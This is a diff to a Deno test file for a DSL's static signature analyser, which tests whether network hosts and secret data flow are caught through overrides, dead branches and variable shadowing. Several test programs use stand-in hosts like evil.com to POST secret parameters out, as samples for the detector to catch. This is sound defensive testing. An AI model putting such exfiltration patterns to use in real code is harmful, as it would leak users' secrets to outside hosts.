@@ -429,9 +429,11 @@ Deno.test("[CRITICAL-4] forged unbranded Dag objects rejected in apply, map, fil
   ]);
 });
 
-Deno.test("[CRITICAL-4] if_else local override assignments, reference overrides, nested overrides, and shadowing stay in sync", () => {
-  // 1. if_else assigning different overrides to local `f` unions BOTH hosts
-  const branchOverrideProg = parseProg(`
+Deno.test(
+  "[CRITICAL-4] if_else local override assignments, reference overrides, nested overrides, and shadowing stay in sync",
+  async () => {
+    // 1. if_else assigning different overrides to local `f` unions BOTH hosts
+    const branchOverrideProg = parseProg(`
     evilNet = () => httpRequest({ host: "evil.com", path: "/" })
     benignNet = () => httpRequest({ host: "benign.com", path: "/" })
     inner = () => httpRequest({ host: "orig.com", path: "/" })
@@ -445,11 +447,11 @@ Deno.test("[CRITICAL-4] if_else local override assignments, reference overrides,
       return f()
     }
   `);
-  const branchSig = computeSignature(branchOverrideProg, "main");
-  assertEquals(branchSig.hosts, new Set(["evil.com", "benign.com"]));
+    const branchSig = computeSignature(branchOverrideProg, "main");
+    assertEquals(branchSig.hosts, new Set(["evil.com", "benign.com"]));
 
-  // 2. Dead-branch overwrite `f = evil; if (false) { f = benign }; f()` still catches `evil.com`
-  const deadBranchProg = parseProg(`
+    // 2. Dead-branch overwrite `f = evil; if (false) { f = benign }; f()` still catches `evil.com`
+    const deadBranchProg = parseProg(`
     evilNet = () => httpRequest({ host: "evil.com", path: "/" })
     benignNet = () => 1
     inner = () => 0
@@ -462,11 +464,11 @@ Deno.test("[CRITICAL-4] if_else local override assignments, reference overrides,
       return f()
     }
   `);
-  const deadBranchSig = computeSignature(deadBranchProg, "main");
-  assertEquals(deadBranchSig.hosts.has("evil.com"), true);
+    const deadBranchSig = computeSignature(deadBranchProg, "main");
+    assertEquals(deadBranchSig.hosts.has("evil.com"), true);
 
-  // 3. Reference override inside map (`map(step, xs)` overridden with `{ step: evilStep }`)
-  const refOverrideProg = parseProg(`
+    // 3. Reference override inside map (`map(step, xs)` overridden with `{ step: evilStep }`)
+    const refOverrideProg = parseProg(`
     step = (x: string) => x
     evilStep = (x: string) => httpRequest({ host: "evil.com", method: "POST", path: "/leak", body: x }).body
     pipeline = (xs: string[]) => map(step, xs)
@@ -475,15 +477,15 @@ Deno.test("[CRITICAL-4] if_else local override assignments, reference overrides,
       return rewritten({ xs: secrets })
     }
   `);
-  const refSig = computeSignature(refOverrideProg, "main");
-  assertEquals(refSig.hosts, new Set(["evil.com"]));
-  assertEquals(
-    refSig.dataFlow.get("host:evil.com"),
-    new Set(["param:secrets"]),
-  );
+    const refSig = computeSignature(refOverrideProg, "main");
+    assertEquals(refSig.hosts, new Set(["evil.com"]));
+    assertEquals(
+      refSig.dataFlow.get("host:evil.com"),
+      new Set(["param:secrets"]),
+    );
 
-  // 4. Nested override merges outer and inner replacements identically to graph.ts
-  const nestedOverrideProg = parseProg(`
+    // 4. Nested override merges outer and inner replacements identically to graph.ts
+    const nestedOverrideProg = parseProg(`
     opA = (x: string) => x
     opB = (x: string) => x
     evilA = (x: string) => httpRequest({ host: "evil-a.com", method: "POST", path: "/a", body: x }).body
@@ -492,40 +494,89 @@ Deno.test("[CRITICAL-4] if_else local override assignments, reference overrides,
     mid = (x: string) => override(leaf, { opB: benignB })({ x })
     main = (secret: string) => override(mid, { opA: evilA })({ x: secret })
   `);
-  const nestedSig = computeSignature(nestedOverrideProg, "main");
-  assertEquals(nestedSig.hosts, new Set(["evil-a.com"]));
-  assertEquals(
-    nestedSig.dataFlow.get("host:evil-a.com"),
-    new Set(["param:secret"]),
-  );
+    const nestedSig = computeSignature(nestedOverrideProg, "main");
+    assertEquals(nestedSig.hosts, new Set(["evil-a.com"]));
+    assertEquals(
+      nestedSig.dataFlow.get("host:evil-a.com"),
+      new Set(["param:secret"]),
+    );
 
-  // 5. Shadowing top-level function with param or local is rejected
-  assertThrows(
-    () =>
-      parseProg(`
-        helper = (x: number) => x
-        main = (helper: number) => helper
-      `),
-    Error,
-    "cannot shadow function",
-  );
-  assertThrows(
-    () =>
-      parseProg(`
-        helper = (x: number) => x
-        main = () => {
-          helper = 123
-          return helper
-        }
-      `),
-    Error,
-    "cannot shadow function",
-  );
+    // 5. Shadowing top-level function with param or local maintains lexical parity
+    //    (allowing UI DSLs like `stat = (label, value) => ...` alongside `label = (...) => ...`,
+    //    while never letting local shadowing smuggle calls past computeSignature!)
+    const shadowedParamProg = parseProg(`
+    label = (t: string, field: string) => ({ tag: "label", for: field, text: t })
+    stat = (label: string, value: string) => ({ label: label, value: value })
+    main = (s: string) => stat(s, "42")
+  `);
+    const shadowedParamSig = computeSignature(shadowedParamProg, "main");
+    assertEquals(shadowedParamSig.hosts.size, 0);
+    assertEquals(
+      await interpret(shadowedParamProg, "main", { s: "Users" }, { fetch }),
+      {
+        label: "Users",
+        value: "42",
+      },
+    );
 
-  // 6. __arg0 key rejected in call/object literals
-  assertThrows(
-    () =>
-      parseProg(`
+    const shadowedLocalAttackProg = parseProg(`
+    helper = (x: string) => x
+    evil = (x: string) => httpRequest({ host: "evil-shadow.com", method: "POST", path: "/", body: x }).body
+    main = (secret: string) => {
+      helper = evil
+      return helper({ x: secret })
+    }
+  `);
+    const shadowedLocalSig = computeSignature(shadowedLocalAttackProg, "main");
+    assertEquals(shadowedLocalSig.hosts, new Set(["evil-shadow.com"]));
+    assertEquals(
+      shadowedLocalSig.dataFlow.get("host:evil-shadow.com"),
+      new Set(["param:secret"]),
+    );
+
+    const shadowedBranchAttackProg = parseProg(`
+    helper = (x: string) => x
+    evil = (x: string) => httpRequest({ host: "evil-branch-shadow.com", method: "POST", path: "/", body: x }).body
+    main = (secret: string, flag: boolean) => {
+      if (flag) {
+        helper = evil
+      } else {
+        helper = helper
+      }
+      return helper({ x: secret })
+    }
+  `);
+    const shadowedBranchSig = computeSignature(
+      shadowedBranchAttackProg,
+      "main",
+    );
+    assertEquals(shadowedBranchSig.hosts, new Set(["evil-branch-shadow.com"]));
+    assertEquals(
+      shadowedBranchSig.dataFlow.get("host:evil-branch-shadow.com"),
+      new Set(["param:secret"]),
+    );
+
+    // Local arrow-function helpers support positional and named invocation with full taint tracking
+    const localLambdaHelperProg = parseProg(`
+    main = (secret: string) => {
+      events = [{ title: "Election 2026", secret: secret }]
+      extractInfo = (list) => {
+        return map((e) => ({ title: e.title, leaked: httpRequest({ host: "local-helper.com", method: "POST", path: "/", body: e.secret }).body }), list)
+      }
+      return { ai: extractInfo(events) }
+    }
+  `);
+    const localLambdaSig = computeSignature(localLambdaHelperProg, "main");
+    assertEquals(localLambdaSig.hosts, new Set(["local-helper.com"]));
+    assertEquals(
+      localLambdaSig.dataFlow.get("host:local-helper.com"),
+      new Set(["param:secret"]),
+    );
+
+    // 6. __arg0 key rejected in call/object literals
+    assertThrows(
+      () =>
+        parseProg(`
         alt = (x: string) => x
         sink = (x: string) => x
         main = (s: string) => {
@@ -533,10 +584,11 @@ Deno.test("[CRITICAL-4] if_else local override assignments, reference overrides,
           return f({ __arg0: s })
         }
       `),
-    Error,
-    "Reserved key '__arg0'",
-  );
-});
+      Error,
+      "Reserved key '__arg0'",
+    );
+  },
+);
 
 // ============================================================================
 // 5. [CRITICAL-5] Cross-Tenant Concurrency Races
